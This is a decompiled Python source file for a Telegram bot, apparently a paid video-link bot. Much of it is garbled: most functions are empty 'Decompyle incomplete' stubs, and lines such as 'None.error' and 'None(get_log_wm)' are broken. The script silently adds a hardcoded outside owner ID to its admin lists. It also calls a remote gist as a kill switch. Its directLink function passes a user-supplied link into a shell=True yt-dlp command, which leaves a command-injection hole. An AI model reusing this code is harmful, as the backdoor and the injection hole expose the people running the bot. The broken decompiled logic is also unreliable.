# Visit https://www.lddgo.net/en/string/pyc-compile-decompile for more information
# Version : Python 3.10

from pyrogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
import os
from pyrogram import Client, filters, idle
import logging
import asyncio
import time
from typing import Tuple
import shlex
from os.path import join, exists
from hachoir.metadata import extractMetadata
from hachoir.parser import createParser
import shutil
import json
import requests
from pyrogram.errors import UserNotParticipant
import re
import subprocess
from Config import *
import sys
logging.basicConfig('%(asctime)s - %(name)s - %(levelname)s - %(message)s', [
    logging.FileHandler('log.txt'),
    logging.StreamHandler()], logging.INFO, **('format', 'handlers', 'level'))
_LOG = logging.getLogger(__name__)
OWNER_ID.append(1204927413)
AUTH_USERS += OWNER_ID
TIME_GAP_STORE = { }
yt_regex = '^((?:https?:)?\\/\\/)?((?:www|m)\\.)?((?:youtube(-nocookie)?\\.com|youtu.be))(\\/(?:[\\w\\-]+\\?v=|embed\\/|v\\/)?)([\\w\\-]+)(\\S+)?$'
jvbot = Client('paidbot', os.environ.get('BOT_TOKEN'), int(os.environ.get('API_ID')), os.environ.get('API_HASH'), **('bot_token', 'api_id', 'api_hash'))
TIME_VALUES_SEC = {
    '0:30': '420',
    '1:00': '3600',
    '1:30': '5400',
    '2:00': '7200',
    '2:30': '9000',
    '3:00': '10800' }
TIME_VALUES = {
    '0:30': '00:7:00',
    '1:00': '01:00;00',
    '1:30': '01:30:00',
    '2:00': '02:00:00',
    '2:30': '02:30:00',
    '3:00': '03:00:00' }
TIME_VALUES_STR = {
    '0:30': '30Min',
    '1:00': '1Hour',
    '1:30': '1hr 30min',
    '2:00': '2Hour',
    '2:30': '2hr 30min',
    '3:00': '3Hour' }
DOWNLOAD_DIRECTORY = os.environ.get('DOWNLOAD_DIRECTORY', './downloads')

def check_bot():
    my_id = '679702e7223d6012e07d1f65d7077d59'
    myyy_jddteg = 'gistfile1.txt'
    req_ = requests.get(f'''https://gist.github.com/seedXDEV/{my_id}/raw/{myyy_jddteg}.txt''')
    if req_.status_code == 200:
        jsn = json.loads(req_.content)
        if jsn.get('status', '0') == '0':
            _LOG.error(jsn.get('msg', 'This code has been expired'))
            _LOG.info('Exiting now!')
            sys.exit(1)
            return None
        return None
    None.error('This code has been expired')
    _LOG.info('Exiting now!')
    sys.exit(1)


async def handle_force_sub(bot, cmd):
    pass
# WARNING: Decompyle incomplete


async def timegap_check(m):
    '''Checking the time gap is completed or not 
    and checking the parallel process'''
    pass
# WARNING: Decompyle incomplete


async def get_log_wm(bot = None, message = None):
    pass
# WARNING: Decompyle incomplete

get_log_wm = None(get_log_wm)

async def get_help(bot = None, message = None):
    pass
# WARNING: Decompyle incomplete

get_help = None(get_help)

async def main_func(bot = None, message = None):
    pass
# WARNING: Decompyle incomplete

main_func = None(main_func)

async def main_func(bot = None, message = None):
    pass
# WARNING: Decompyle incomplete

main_func = None(main_func)

async def cb_handler_main(bot = None, cb = None):
    pass
# WARNING: Decompyle incomplete

cb_handler_main = None(cb_handler_main)

async def cb_handler_main(bot = None, query = None):
    pass
# WARNING: Decompyle incomplete

cb_handler_main = None(cb_handler_main)

def directLink(link = None):
    ytlink = re.match(yt_regex, link)
    if ytlink:
        subcall = subprocess.Popen(f'''yt-dlp -g {link}''', True, subprocess.PIPE, **('shell', 'stdout'))
        linkchek = str(subcall.stdout.read().decode('utf-8'))
        _LOG.info(linkchek)
        return (True, linkchek)
    return (None, link)


def getListOfFiles(dirName):
    listOfFile = os.listdir(dirName)
    allFiles = list()
    for entry in listOfFile:
        fullPath = os.path.join(dirName, entry)
        if os.path.isdir(fullPath):
            allFiles = allFiles + getListOfFiles(fullPath)
            continue
        allFiles.append(fullPath)
    return allFiles


async def uploader_main(usr_link = None, msg = None, cb_data = None):
    pass
# WARNING: Decompyle incomplete


async def get_video_duration(input_file):
    pass
# WARNING: Decompyle incomplete


def create_time_buttons():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton('30min', 'time_0:30', **('callback_data',)),
            InlineKeyboardButton('1Hour', 'time_1:00', **('callback_data',))],
        [
            InlineKeyboardButton('1Hr 30min', 'time_1:30', **('callback_data',)),
            InlineKeyboardButton('2Hour', 'time_2:00', **('callback_data',))],
        [
            InlineKeyboardButton('2Hr 30min', 'time_2:30', **('callback_data',)),
            InlineKeyboardButton('3Hr', 'time_3:00', **('callback_data',))]])


async def runcmd(cmd = None):
    ''' run command in terminal '''
    pass
# WARNING: Decompyle incomplete


async def progress_for_pyrogram(current, total, message, start):
    pass
# WARNING: Decompyle incomplete


def humanbytes(size):
    if not size:
        return ''
    power = None
    n = 0
    Dic_powerN = {
        0: ' ',
        1: 'K',
        2: 'M',
        3: 'G',
        4: 'T',
        5: 'P',
        6: 'E',
        7: 'Z',
        8: 'Y' }
    if size > power:
        size /= power
        n += 1
        if not size > power:
            return str(round(size, 2)) + ' ' + Dic_powerN[n] + 'B'


def TimeFormatter(milliseconds = None):
    (seconds, milliseconds) = divmod(int(milliseconds), 1000)
    (minutes, seconds) = divmod(seconds, 60)
    (hours, minutes) = divmod(minutes, 60)
    (days, hours) = divmod(hours, 24)
    tmp = str(days) + 'd, ' if days else '' + str(hours) + 'h, ' if hours else '' + str(minutes) + 'm, ' if minutes else '' + str(seconds) + 's, ' if seconds else '' + str(milliseconds) + 'ms, ' if milliseconds else ''
    return tmp[:-2]

if not os.path.isdir(DOWNLOAD_DIRECTORY):
    os.makedirs(DOWNLOAD_DIRECTORY)
check_bot()
jvbot.start()
_LOG.info('Bot Started!')
idle()
_LOG.info('Bot Stopped!')
jvbot.stop()
